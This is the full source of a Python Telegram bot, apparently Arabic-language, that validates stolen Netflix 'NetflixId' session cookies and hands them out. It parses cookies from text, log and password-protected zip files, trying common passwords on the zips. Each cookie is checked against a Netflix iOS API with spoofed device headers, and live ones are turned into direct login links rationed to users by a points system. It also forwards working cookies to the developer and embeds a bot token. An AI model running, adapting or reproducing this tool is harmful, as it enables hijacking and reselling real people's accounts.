import telebot
import pyzipper
import os
import re
import shutil
import urllib.parse
import time
import requests
import threading
from datetime import datetime
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from urllib3.exceptions import InsecureRequestWarning

# --- إعدادات البوت والتوكن ---
TOKEN = '8890151932:AAEQApHwQ4KGsKqWzkxwyJ3HRhwB7FzI808'
bot = telebot.TeleBot(TOKEN)

# 👑 إعدادات المطور الخاصة بك (فارس)
DEVELOPER_CHAT_ID = 8713916851
DEVELOPER_USERNAME = "farxxes" 
CHANNEL_LINK = "https://t.me/farxxess"

# تعطيل تحذيرات SSL
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

COMMON_PASSWORDS = ["123", "1234", "admin", "cookies", "netflix", "premium", "troxdrop"]
BASE_TEMP_DIR = "final_output_temp"
if not os.path.exists(BASE_TEMP_DIR):
    os.makedirs(BASE_TEMP_DIR)

# --- قواعد البيانات المؤقتة في الذاكرة ---
VALID_COOKIES_POOL = []      
USED_COOKIES_HISTORY = set() 
USER_DATABASE = {}           
BANNED_USERS = set()         
active_scans = {}            

API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
QUERY_PARAMS = {
    "appVersion": "15.48.1",
    "device_type": "NFAPPL-02-",
    "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "idiom": "phone",
    "iosVersion": "15.8.5",
    "modelType": "IPHONE8-1",
    "path": '["account","token","default"]',
    "pathFormat": "graph",
    "responseFormat": "json",
}

BASE_HEADERS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
    "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "x-netflix.client.appversion": "15.48.1",
    "accept-language": "en-US;q=1",
}

def check_ban(func):
    def wrapper(message, *args, **kwargs):
        try:
            chat_id = message.chat.id if hasattr(message, 'chat') else message.message.chat.id
        except Exception:
            chat_id = message.message.chat.id
            
        if chat_id in BANNED_USERS:
            bot.send_message(chat_id, "❌ عذراً، تم حظرك من استخدام البوت من قبل الإدارة.")
            return
        return func(message, *args, **kwargs)
    return wrapper

def extract_clean_netflix_ids(text):
    cleaned_ids = []
    netscape_matches = re.findall(r"NetflixId\s+([^\s\n\r]+)", text)
    for val in netscape_matches:
        decoded = urllib.parse.unquote(val) if "%" in val else val
        if decoded not in cleaned_ids and len(decoded) > 20:
            cleaned_ids.append(decoded)
            
    standard_matches = re.findall(r"NetflixId=([^;\s\n`]+)", text)
    for val in standard_matches:
        decoded = urllib.parse.unquote(val) if "%" in val else val
        if decoded not in cleaned_ids and len(decoded) > 20:
            cleaned_ids.append(decoded)
    return cleaned_ids

def check_netflix_cookie_detailed(netflix_id):
    headers = dict(BASE_HEADERS)
    headers["Cookie"] = f"NetflixId={netflix_id}"
    try:
        response = requests.get(API_URL, params=QUERY_PARAMS, headers=headers, timeout=10, verify=False)
        if response.status_code == 200:
            data = response.json()
            value_data = data.get("value", {})
            account_info = value_data.get("account", {}).get("token", {}).get("default", {})
            token = account_info.get("token")
            expires = account_info.get("expires")
            
            if token:
                # استخراج معلومات الباقة لتصنيف الحساب (Premium أم Free/Basic)
                plan_info = value_data.get("currentPlan", {}) or value_data.get("plan", {})
                plan_name = str(plan_info).lower()
                
                is_premium = True
                if "basic" in plan_name or "free" in plan_name or "ads" in plan_name:
                    is_premium = False

                return {
                    "token": token, 
                    "expires": expires, 
                    "bypass": False, 
                    "is_premium": is_premium
                }
        return None
    except Exception:
        return None

def auto_clean_pool_job():
    global VALID_COOKIES_POOL
    while True:
        time.sleep(43200) 
        if VALID_COOKIES_POOL:
            print("🔄 جاري تنظيف المخزن تلقائياً...")
            still_valid = []
            for cookie in VALID_COOKIES_POOL:
                if check_netflix_cookie_detailed(cookie):
                    still_valid.append(cookie)
            VALID_COOKIES_POOL = still_valid
            print(f"✅ انتهى التنظيف. المتبقي: {len(VALID_COOKIES_POOL)}")

threading.Thread(target=auto_clean_pool_job, daemon=True).start()

def safe_send_message(chat_id, text, markup=None):
    while True:
        try:
            return bot.send_message(chat_id, text, reply_markup=markup, disable_web_page_preview=True, parse_mode="Markdown")
        except telebot.apihelper.ApiTelegramException as e:
            if e.error_code == 429:
                retry_after = int(re.search(r'retry after (\d+)', e.description).group(1)) if re.search(r'retry after (\d+)', e.description) else 5
                time.sleep(retry_after + 1)
            else:
                break
    return None

def _threaded_cookies_check(chat_id, netflix_ids, reply_to_message_id, source_name):
    if chat_id not in USER_DATABASE:
        USER_DATABASE[chat_id] = {"points": 5, "username": "", "role": "MEMBER"}

    total_count = len(netflix_ids)
    active_scans[chat_id] = True
    
    clean_source_name = source_name.replace("_", "\\_").replace("*", "\\*").replace("`", "\\`").replace("[", "\\[")
    
    live_accounts_accumulator = []
    stop_markup = InlineKeyboardMarkup().add(InlineKeyboardButton("🛑 إيقاف الفحص", callback_data=f"stop_scan_{chat_id}"))
    
    # رسالة الحالة الابتدائية
    initial_status_text = (
        f"⚡ **Processing Progress**\n\n"
        f"Total Cookies: {total_count}\n"
        f"Mode: FullInfo\n"
        f"Filter: All accounts\n\n"
        f"Current Status:\n"
        f"[░░░░░░░░░░░░░░░░░░░░] 0%\n\n"
        f"🔍 Processing: 0/{total_count}\n"
        f"✅ Valid: 0\n"
        f"👑 Premium: 0\n"
        f"👤 Free/Basic: 0\n"
        f"❌ Invalid: 0\n"
    )
    status = bot.send_message(chat_id, initial_status_text, reply_to_message_id=reply_to_message_id, reply_markup=stop_markup)
    
    valid_count, premium_count, free_count, dead_count, dup_count = 0, 0, 0, 0, 0

    for index, netflix_id in enumerate(netflix_ids, start=1):
        if not active_scans.get(chat_id, False):
            safe_send_message(chat_id, f"🛑 تم إلغاء الفحص بواسطة المستخدم!")
            return

        is_duplicate = netflix_id in USED_COOKIES_HISTORY

        # حساب النسبة المئوية وشريط التقدم
        progress_pct = int((index / total_count) * 100)
        progress_bar = "█" * int(progress_pct / 5) + "░" * (20 - int(progress_pct / 5))

        result = check_netflix_cookie_detailed(netflix_id)
        if result:
            valid_count += 1
            if result["is_premium"]:
                premium_count += 1
            else:
                free_count += 1

            if is_duplicate:
                dup_count += 1
            else:
                USED_COOKIES_HISTORY.add(netflix_id)
                if netflix_id not in VALID_COOKIES_POOL:
                    VALID_COOKIES_POOL.append(netflix_id)
                
            token = result["token"]
            expires = result["expires"]
            if isinstance(expires, int) and len(str(expires)) == 13: 
                expires //= 1000
            date_str = datetime.fromtimestamp(expires).strftime('%d %B %Y') if expires else "Unknown"
            
            full_cookie_string = f"NetflixId={netflix_id}"
            direct_netflix_url = "https://www.netflix.com/" if result["bypass"] else f"https://netflix.com/?nftoken={token}"
            encoded_cookie = urllib.parse.quote(full_cookie_string)
            bridge_login_url = f"https://nftokengen-7ik6.onrender.com/nf/netflix?cookie={encoded_cookie}"
            
            acc_type_label = "👑 PREMIUM ACCOUNT" if result["is_premium"] else "👤 FREE/BASIC ACCOUNT"
            res_text = f"🌟 **{acc_type_label}** 🌟\n\n📁 المصدر: {clean_source_name}\n• انتهاء الفواتير: {date_str}\n\n🔗 الرابط المباشر:\n{direct_netflix_url}"
            txt_entry = f"Cookie: {full_cookie_string}\nURL: {direct_netflix_url}\n====================\n\n"
            live_accounts_accumulator.append(txt_entry)
            
            markup = InlineKeyboardMarkup().add(InlineKeyboardButton("💻 PC Login", url=direct_netflix_url), InlineKeyboardButton("📱 Phone Login", url=bridge_login_url))
            safe_send_message(chat_id, res_text, markup)
            time.sleep(1.0)
        else:
            dead_count += 1

        # تحديث واجهة التقدم كل حسابين أو عند النهاية لتجنب ضغط الـ API
        if index % 2 == 0 or index == total_count:
            try:
                live_status_text = (
                    f"⚡ **Processing Progress**\n\n"
                    f"Total Cookies: {total_count}\n"
                    f"Mode: FullInfo\n"
                    f"Filter: All accounts\n\n"
                    f"Current Status:\n"
                    f"[{progress_bar}] {progress_pct}%\n\n"
                    f"🔍 Processing: {index}/{total_count}\n"
                    f"✅ Valid: {valid_count}\n"
                    f"👑 Premium: {premium_count}\n"
                    f"👤 Free/Basic: {free_count}\n"
                    f"❌ Invalid: {dead_count}\n"
                )
                bot.edit_message_text(live_status_text, chat_id, status.message_id, reply_markup=stop_markup)
            except Exception:
                pass

        time.sleep(0.1)

    active_scans.pop(chat_id, None)
    safe_send_message(chat_id, f"📊 **اكتمل الفحص والتصفية بنجاح!**\n\n✅ الصالح: {valid_count}\n👑 البريميوم: {premium_count}\n👤 العادي/فري: {free_count}\n❌ التالف: {dead_count}\n\n🪙 رصيدك الحالي: {USER_DATABASE[chat_id]['points']} نقطة 🪙")
    if live_accounts_accumulator: 
        send_txt_file(chat_id, live_accounts_accumulator, source_name)

def process_cookies_list_and_check(chat_id, netflix_ids, reply_to_message_id, source_name="Cookies_File.txt"):
    if not netflix_ids:
        safe_send_message(chat_id, "❌ لم يتم العثور على أي كوكيز صالحة للعمل.")
        return
    
    threading.Thread(
        target=_threaded_cookies_check, 
        args=(chat_id, netflix_ids, reply_to_message_id, source_name), 
        daemon=True
    ).start()

def send_txt_file(chat_id, accounts_list, original_filename):
    try:
        clean_name = os.path.splitext(original_filename)[0]
        output_txt_path = os.path.join(BASE_TEMP_DIR, f"{clean_name}_LIVE.txt")
        with open(output_txt_path, 'w', encoding='utf-8') as f:
            for item in accounts_list: 
                f.write(item)
        with open(output_txt_path, 'rb') as doc:
            bot.send_document(chat_id, doc, caption=f"📁 ملف الحسابات الشغالة المجمعة الخريجة من الفحص الحالي 🔥")
        if os.path.exists(output_txt_path): 
            os.remove(output_txt_path)
    except Exception as e: 
        print(e)

def generate_main_keyboard(user_id):
    points = USER_DATABASE.get(user_id, {}).get("points", 5)
    role = USER_DATABASE.get(user_id, {}).get("role", "MEMBER")
    markup = InlineKeyboardMarkup()
    markup.row_width = 1
    
    markup.add(InlineKeyboardButton("🔍 فحص (ملف/نص/رابط)", callback_data="menu_check"))
    
    if user_id == DEVELOPER_CHAT_ID:
        markup.add(InlineKeyboardButton("🎁 سحب رابط نتفلكس (صلاحية المطور ♾️)", callback_data="dispense_live_link"))
    elif role == "VIP":
        markup.add(InlineKeyboardButton("🎁 سحب رابط نتفلكس (وضع الـ VIP لا ينتهي 💎)", callback_data="dispense_live_link"))
    elif points > 0:
        markup.add(InlineKeyboardButton(f"🎁 سحب رابط نتفلكس (تكلفة: 1 نقطة) 🪙", callback_data="dispense_live_link"))
    else:
        markup.add(InlineKeyboardButton("📬 نفدت نقاطك! تواصل مع المطور فارس لشحن رصيدك 🫡", url=f"https://t.me/{DEVELOPER_USERNAME}"))
        
    markup.add(InlineKeyboardButton("📊 فحص المخزن والنقاط", callback_data="check_pool_status"))
    
    if user_id == DEVELOPER_CHAT_ID:
        markup.add(InlineKeyboardButton("👑 لوحة تحكم المطور السريّة", callback_data="open_admin_panel"))
    return markup

@bot.message_handler(commands=['start'])
@check_ban
def send_welcome(message):
    chat_id = message.chat.id
    if chat_id not in USER_DATABASE:
        USER_DATABASE[chat_id] = {"points": 5, "username": message.from_user.username or "", "role": "MEMBER"}
        welcome_txt = "مرحباً بك في بوت نتفلكس الذكي الخاص بفارس 😉🔥\n\n🎁 كهدية ترحيبية، **تم منحك 5 نقاط مجانية** للتجربة فوراً!"
    else:
        welcome_txt = "مرحباً بك مجدداً في لوحة التحكم الخاصة بك المحدثة 👇"
        
    bot.reply_to(message, welcome_txt, reply_markup=generate_main_keyboard(chat_id))

@bot.message_handler(commands=['id'])
@check_ban
def send_user_id(message):
    chat_id = message.chat.id
    user_first_name = message.from_user.first_name
    id_text = (
        f"👤 **معلومات الحساب الخاص بك:**\n\n"
        f"• الاسم: **{user_first_name}**\n"
        f"• الآيدي الخاص بك (ID): `{chat_id}`\n\n"
        f"💡 _اضغط على الآيدي لنسخه تلقائياً وإرساله للمطور فارس إذا كنت تريد شحن نقاطك!_"
    )
    bot.reply_to(message, id_text, parse_mode="Markdown")

@bot.message_handler(commands=['add'])
def add_points_command(message):
    if message.chat.id != DEVELOPER_CHAT_ID: 
        return
    try:
        command_parts = message.text.split()
        if message.reply_to_message:
            target_id = message.reply_to_message.from_user.id
            amount = int(command_parts[1])
        else:
            amount = int(command_parts[1])
            target_id = int(command_parts[2])
            
        if target_id not in USER_DATABASE: 
            USER_DATABASE[target_id] = {"points": 5, "username": "", "role": "MEMBER"}
        USER_DATABASE[target_id]["points"] += amount
        bot.reply_to(message, f"✅ تم إضافة **+{amount}** نقطة بنجاح لحسابه.")
    except Exception:
        bot.reply_to(message, "⚠️ الاستخدام: بالرد `/add 10` أو رسالة عادية `/add 10 [الآيدي]`")

@bot.message_handler(commands=['setvip'])
def set_vip_command(message):
    if message.chat.id != DEVELOPER_CHAT_ID: 
        return
    try:
        command_parts = message.text.split()
        target_id = message.reply_to_message.from_user.id if message.reply_to_message else int(command_parts[1])
        if target_id not in USER_DATABASE: 
            USER_DATABASE[target_id] = {"points": 5, "username": "", "role": "MEMBER"}
        USER_DATABASE[target_id]["role"] = "VIP"
        bot.reply_to(message, f"👑 تم ترقية المستخدم `{target_id}` إلى رتبة **VIP** بنجاح! سحب مجاني للأبد.")
    except Exception:
        bot.reply_to(message, "⚠️ الاستخدام: بالرد `/setvip` أو عادياً `/setvip [الآيدي]`")

@bot.message_handler(commands=['ban'])
def ban_user_command(message):
    if message.chat.id != DEVELOPER_CHAT_ID: 
        return
    try:
        command_parts = message.text.split()
        target_id = message.reply_to_message.from_user.id if message.reply_to_message else int(command_parts[1])
        BANNED_USERS.add(target_id)
        bot.reply_to(message, f"🚫 تم حظر المستخدم `{target_id}` بنجاح.")
    except Exception:
        bot.reply_to(message, "⚠️ الاستخدام: بالرد `/ban` أو عادياً `/ban [الآيدي]`")

@bot.message_handler(commands=['unban'])
def unban_user_command(message):
    if message.chat.id != DEVELOPER_CHAT_ID: 
        return
    try:
        command_parts = message.text.split()
        target_id = message.reply_to_message.from_user.id if message.reply_to_message else int(command_parts[1])
        BANNED_USERS.discard(target_id)
        bot.reply_to(message, f"🟢 تم إلغاء حظر المستخدم `{target_id}` بنجاح.")
    except Exception:
        bot.reply_to(message, "⚠️ الاستخدام: بالرد `/unban` أو عادياً `/unban [الآيدي]`")

def execute_dispense_logic(chat_id):
    if chat_id not in USER_DATABASE:
        USER_DATABASE[chat_id] = {"points": 5, "username": "", "role": "MEMBER"}
        
    role = USER_DATABASE[chat_id]["role"]
    if chat_id != DEVELOPER_CHAT_ID and role != "VIP" and USER_DATABASE[chat_id]["points"] <= 0:
        return {"status": "no_points"}
        
    if not VALID_COOKIES_POOL:
        return {"status": "empty", "message": "❌ المخزن فارغ حالياً! ارسل ملف كوكيز أولاً لتعبئته."}
    
    while VALID_COOKIES_POOL:
        current_cookie = VALID_COOKIES_POOL.pop(0)
        fresh_result = check_netflix_cookie_detailed(current_cookie)
        
        if fresh_result:
            if chat_id != DEVELOPER_CHAT_ID and role != "VIP":
                USER_DATABASE[chat_id]["points"] -= 1
            
            token = fresh_result["token"]
            expires = fresh_result["expires"]
            if isinstance(expires, int) and len(str(expires)) == 13: 
                expires //= 1000
            date_str = datetime.fromtimestamp(expires).strftime('%d %B %Y') if expires else "Unknown"
            
            full_cookie_string = f"NetflixId={current_cookie}"
            direct_netflix_url = "https://www.netflix.com/" if fresh_result["bypass"] else f"https://netflix.com/?nftoken={token}"
            short_id = current_cookie[:20]
            
            points_display = "♾️ وضع المطور" if chat_id == DEVELOPER_CHAT_ID else ("💎 وضع VIP" if role == "VIP" else f"{USER_DATABASE[chat_id]['points']} نقطة")
            success_text = (
                f"🎉 **تفضل رابط نتفلكس الطازج الخاص بك** 🎉\n\n"
                f"🪙 رصيدك المتبقي الحالي: {points_display}.\n"
                f"📅 **تاريخ الفواتير القادم:** {date_str}\n\n"
                f"🔗 **رابط الدخول المباشر المؤقت:**\n{direct_netflix_url}\n\n"
                f"🤔 **هل اشتغل معك الرابط بدون مشاكل؟** يرجى التقييم بالأسفل 👇"
            )
            
            user_markup = InlineKeyboardMarkup()
            user_markup.row_width = 2
            
            user_markup.add(
                InlineKeyboardButton("💻 دخول للكمبيوتر", url=direct_netflix_url), 
                InlineKeyboardButton("📺 تفعيل شاشة TV", url="https://www.netflix.com/tv8")
            )
            user_markup.add(InlineKeyboardButton("📺 كيف أستخدم الرابط؟", callback_data="ask_how_to_use"))
            user_markup.add(
                InlineKeyboardButton("✅ نعم، اشتغل تماماً", callback_data=f"fb_yes_{short_id}"), 
                InlineKeyboardButton("❌ لا، لم يشتغل معي", callback_data=f"fb_no_{short_id}")
            )
            
            if current_cookie not in VALID_COOKIES_POOL:
                VALID_COOKIES_POOL.append(current_cookie)
                
            return {"status": "success", "text": success_text, "markup": user_markup}
        else:
            continue
            
    return {"status": "expired", "message": "❌ عذراً، انتهت صلاحية الكوكيز المتوفرة بالمخزن فجأة."}

@bot.callback_query_handler(func=lambda call: call.data == "ask_how_to_use")
@check_ban
def handle_ask_method(call):
    bot.answer_callback_query(call.id)
    chan_markup = InlineKeyboardMarkup().add(InlineKeyboardButton("🔗 اضغط هنا لمشاهدة الطريقة", url=CHANNEL_LINK))
    bot.send_message(
        call.message.chat.id, 
        "🤔 **هل تريد الطريقة؟**\n\nإذاً نعم، سوف أعطيك رابط قناتي متوفر فيها الشرح بالكامل بالتفصيل 👇", 
        reply_markup=chan_markup
    )

@bot.callback_query_handler(func=lambda call: call.data == "dispense_live_link")
@check_ban
def dispense_account_on_button(call):
    chat_id = call.message.chat.id
    bot.answer_callback_query(call.id, "⏳ جاري فحص الحساب وسحب الرابط...")
    response = execute_dispense_logic(chat_id)
    
    if response["status"] == "success":
        bot.send_message(chat_id, response["text"], reply_markup=response["markup"], parse_mode="Markdown")
    elif response["status"] == "no_points":
        bot.send_message(chat_id, "❌ رصيد نقاطك انتهى تماماً! يرجى التواصل مع فارس لشحن رصيدك.", reply_markup=generate_main_keyboard(chat_id))
    else:
        bot.send_message(chat_id, response["message"])

@bot.callback_query_handler(func=lambda call: call.data == "menu_check")
def menu_check_button(call):
    bot.edit_message_text("🔍 أرسل الملف (Txt/Zip) أو الكوكيز كنص الآن وسأفحصه فوراً!", call.message.chat.id, call.message.message_id)

@bot.callback_query_handler(func=lambda call: call.data == "check_pool_status")
@check_ban
def pool_status(call):
    chat_id = call.message.chat.id
    bot.answer_callback_query(call.id)
    role = USER_DATABASE.get(chat_id, {}).get("role", "MEMBER")
    points = "♾️ (أنت صاحب البوت)" if chat_id == DEVELOPER_CHAT_ID else ("💎 وضع VIP (مفتوح)" if role == "VIP" else f"{USER_DATABASE.get(chat_id, {}).get('points', 5)} نقطة 🪙")
    bot.send_message(chat_id, f"📦 **حالة الحساب والمخزن:**\n\n👤 رصيدك الحالي: **{points}**\n📦 إجمالي الكوكيز المتوفر بالمخزن المشترك: **{len(VALID_COOKIES_POOL)}** حساب جاهز.", reply_markup=generate_main_keyboard(chat_id))

@bot.callback_query_handler(func=lambda call: call.data.startswith('fb_'))
@check_ban
def handle_user_feedback(call):
    global VALID_COOKIES_POOL
    data_parts = call.data.split('_')
    action, short_id = data_parts[1], data_parts[2]
    
    user_info = call.from_user
    username = f"@{user_info.username}" if user_info.username else "لا يوجد"
    chat_id = call.message.chat.id
    
    target_cookie = None
    for cookie in VALID_COOKIES_POOL:
        if cookie.startswith(short_id):
            target_cookie = cookie
            break

    if action == "yes":
        bot.answer_callback_query(call.id, "شكراً على تقييمك! مشاهدة ممتعة 🍿🔥", show_alert=True)
        try: 
            bot.edit_message_text("✅ **شكراً واستمتع! 🎬🍿**\n\nتم تأكيد عمل الرابط بنجاح، مشاهدة ممتعة!", chat_id, call.message.message_id, reply_markup=None)
        except Exception: 
            pass
        
        if target_cookie:
            dev_log_text = f"👑 **سحب ناجح!** 👑\n👤 المستعمل: {user_info.first_name} ({username})\n🆔 الأيدي: `{user_info.id}`\n🍪 الكوكيز الفعال:\n`NetflixId={target_cookie}`"
            try: 
                bot.send_message(DEVELOPER_CHAT_ID, dev_log_text, parse_mode="Markdown")
            except Exception: 
                pass
        
    elif action == "no":
        if target_cookie and target_cookie in VALID_COOKIES_POOL:
            VALID_COOKIES_POOL.remove(target_cookie)
            bot.answer_callback_query(call.id, "⚠️ تم الإبلاغ وحذف الحساب التالف، جاري تعويضك فوراً...", show_alert=True)
            try: 
                bot.send_message(DEVELOPER_CHAT_ID, f"❌ تم حذف حساب ميت أبلغ عنه المستخدم: {user_info.first_name}\n🍪 `NetflixId={target_cookie}`")
            except Exception: 
                pass
        else:
            bot.answer_callback_query(call.id, "👌 تم تصفية هذا الحساب مسبقاً، جاري استخراج بديل لك...", show_alert=False)
            
        try: 
            bot.edit_message_text("❌ تم حذف الرابط القديم لعدم عمله! جاري سحب حساب جديد لك فوراً وخصم 1 نقطة... ⏳", chat_id, call.message.message_id, reply_markup=None)
        except Exception: 
            pass

        response = execute_dispense_logic(chat_id)
        if response["status"] == "success":
            bot.send_message(chat_id, response["text"], reply_markup=response["markup"], parse_mode="Markdown")
        elif response["status"] == "no_points":
            bot.send_message(chat_id, "❌ رصيد نقاطك انتهى تماماً! لا يمكن تعويضك بحساب جديد تلقائياً حتى تشحن.", reply_markup=generate_main_keyboard(chat_id))
        else:
            bot.send_message(chat_id, response["message"])

def open_admin_panel_msg(chat_id):
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("📢 إرسال إذاعة جماعية (Broadcast)", callback_data="admin_broadcast"))
    markup.add(InlineKeyboardButton("🔄 تصفير الذاكرة والمكرر", callback_data="admin_clear_history"))
    
    stats_text = (
        f"👑 **مرحباً بك يا مطور البوت (فارس) في لوحتك السرية** 👑\n\n"
        f"📊 **إحصائيات البوت اللحظية:**\n"
        f"👥 إجمالي المستخدمين المسجلين: {len(USER_DATABASE)}\n"
        f"📦 إجمالي الحسابات الشغالة بالمخزن: {len(VALID_COOKIES_POOL)}\n"
        f"🚫 إجمالي المحظورين: {len(BANNED_USERS)}\n"
        f"✂️ إجمالي الكوكيز في مانع التكرار: {len(USED_COOKIES_HISTORY)}"
    )
    bot.send_message(chat_id, stats_text, reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == "open_admin_panel")
def handle_admin_click(call):
    if call.message.chat.id == DEVELOPER_CHAT_ID:
        bot.answer_callback_query(call.id)
        open_admin_panel_msg(call.message.chat.id)

@bot.callback_query_handler(func=lambda call: call.data == "admin_broadcast")
def start_broadcast_process(call):
    bot.answer_callback_query(call.id)
    msg = bot.send_message(DEVELOPER_CHAT_ID, "📢 أرسل لي الآن الرسالة التي تريد إذاعتها لجميع مستخدمي البوت فوراً:")
    bot.register_next_step_handler(msg, process_broadcast_sending)

def process_broadcast_sending(message):
    if message.chat.id != DEVELOPER_CHAT_ID: 
        return
    broadcast_text = message.text
    sent_count = 0
    bot.send_message(DEVELOPER_CHAT_ID, "⏳ جاري بدء الإذاعة ونشر الرسالة لجميع المشتركين...")
    
    for u_id in list(USER_DATABASE.keys()):
        try:
            bot.send_message(u_id, f"📢 **إعلان من إدارة البوت:**\n\n{broadcast_text}", parse_mode="Markdown")
            sent_count += 1
            time.sleep(0.05)
        except Exception: 
            pass
            
    bot.send_message(DEVELOPER_CHAT_ID, f"✅ تمت الإذاعة بنجاح! تم تسليم الرسالة إلى {sent_count} مستخدم نشط 🚀")

@bot.callback_query_handler(func=lambda call: call.data == "admin_clear_history")
def clear_history_action(call):
    global USED_COOKIES_HISTORY
    USED_COOKIES_HISTORY.clear()
    bot.answer_callback_query(call.id, "✅ تم مسح تاريخ التكرار بنجاح لإتاحة فحص الملفات القديمة مجدداً.", show_alert=True)

def unzip_and_extract_ids(zip_path, extract_to, password=None):
    try:
        with pyzipper.AESZipFile(zip_path) as zip_ref:
            if password: 
                zip_ref.setpassword(password.encode('utf-8'))
            zip_ref.extractall(path=extract_to)
        all_cookies = []
        for root, dirs, files in os.walk(extract_to):
            for file in files:
                if file.endswith('.txt') or file.endswith('.log'):
                    file_path = os.path.join(root, file)
                    try:
                        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                            content = f.read()
                            for nid in extract_clean_netflix_ids(content):
                                if nid not in all_cookies: 
                                    all_cookies.append(nid)
                    except Exception:
                        pass
        return True, all_cookies, None
    except RuntimeError as e:
        if 'encrypted' in str(e) or 'password' in str(e) or 'Bad password' in str(e): 
            return False, [], "ENCRYPTED"
        return False, [], str(e)
    except Exception as e: 
        return False, [], str(e)

def process_zip_entry(message, file_path, password=None, password_msg_id=None, original_name="Extracted_Archive.txt"):
    chat_id = message.chat.id
    user_work_dir = os.path.join(BASE_TEMP_DIR, f"{chat_id}_{int(time.time())}")
    if os.path.exists(user_work_dir): 
        shutil.rmtree(user_work_dir)
    os.makedirs(user_work_dir)
    success, final_ids, error_type = unzip_and_extract_ids(file_path, user_work_dir, password)
    if password_msg_id:
        try: 
            bot.delete_message(chat_id, password_msg_id)
        except Exception: 
            pass
    if success:
        shutil.rmtree(user_work_dir)
        if os.path.exists(file_path): 
            os.remove(file_path)
        process_cookies_list_and_check(chat_id, final_ids, message.message_id, source_name=original_name)
    elif error_type == "ENCRYPTED":
        if not password:
            for pwd in COMMON_PASSWORDS:
                sec_success, sec_ids, _ = unzip_and_extract_ids(file_path, user_work_dir, pwd)
                if sec_success:
                    shutil.rmtree(user_work_dir)
                    process_zip_entry(message, file_path, password=pwd, original_name=original_name)
                    return
            markup = InlineKeyboardMarkup()
            buttons = [InlineKeyboardButton(pwd, callback_data=f"fanal_{pwd}_{file_path}_{original_name}") for pwd in COMMON_PASSWORDS]
            markup.add(*buttons)
            bot.send_message(chat_id, "⚠️ الملف المضغوط محمي بكلمة مرور! اختر كلمة المرور الشائعة للمتابعة أو الفك الفوري:", reply_markup=markup)
    else: 
        bot.send_message(chat_id, f"❌ حدث خطأ أثناء المعالجة: {error_type}")

@bot.message_handler(content_types=['document'])
@check_ban
def handle_incoming_document(message):
    file_name = message.document.file_name or "file.txt"
    file_name_lower = file_name.lower()
    if file_name_lower.endswith('.zip'):
        file_info = bot.get_file(message.document.file_id)
        local_path = os.path.join(BASE_TEMP_DIR, f"incoming_{message.chat.id}_{int(time.time())}.zip")
        with open(local_path, 'wb') as f: 
            f.write(bot.download_file(file_info.file_path))
        process_zip_entry(message, local_path, original_name=file_name)
    elif file_name_lower.endswith('.txt') or file_name_lower.endswith('.log'):
        file_info = bot.get_file(message.document.file_id)
        file_content = bot.download_file(file_info.file_path).decode('utf-8', errors='ignore')
        process_cookies_list_and_check(message.chat.id, extract_clean_netflix_ids(file_content), message.message_id, source_name=file_name)

@bot.callback_query_handler(func=lambda call: call.data.startswith('fanal_'))
@check_ban
def handle_inline_passwords(call):
    data_parts = call.data.split('_')
    chosen_password = data_parts[1]
    remaining_parts = data_parts[2:]
    original_name = remaining_parts[-1]
    file_path = "_".join(remaining_parts[:-1])
    if os.path.exists(file_path): 
        process_zip_entry(call.message, file_path, password=chosen_password, password_msg_id=call.message.message_id, original_name=original_name)

@bot.callback_query_handler(func=lambda call: call.data.startswith('stop_scan_'))
def handle_stop_button(call):
    target_chat_id = int(call.data.split('_')[2])
    if target_chat_id in active_scans:
        active_scans[target_chat_id] = False
        bot.answer_callback_query(call.id, "🛑 جاري إيقاف عملية الفحص الحالية بناءً على طلبك...")
        try: 
            bot.edit_message_reply_markup(target_chat_id, call.message.message_id, reply_markup=None)
        except Exception: 
            pass

@bot.message_handler(func=lambda message: True)
@check_ban
def handle_plain_text(message):
    text_content = message.text
    extracted_ids = extract_clean_netflix_ids(text_content)
    
    if not extracted_ids:
        bot.reply_to(message, "❌ لم يتم العثور على أي كوكيز نتفلكس صالحة داخل النص المرسل. تأكد من صحة التنسيق.")
        return
        
    process_cookies_list_and_check(message.chat.id, extracted_ids, message.message_id, source_name="Combo_Text.txt")

if __name__ == "__main__":
    print("🚀 تم تشغيل البوت بنجاح وهو نظيف تماماً وخالٍ من الاشتراكات الإجبارية والقنوات...")
    while True:
        try: 
            bot.polling(none_stop=True, skip_pending=True)
        except Exception: 
            time.sleep(3)
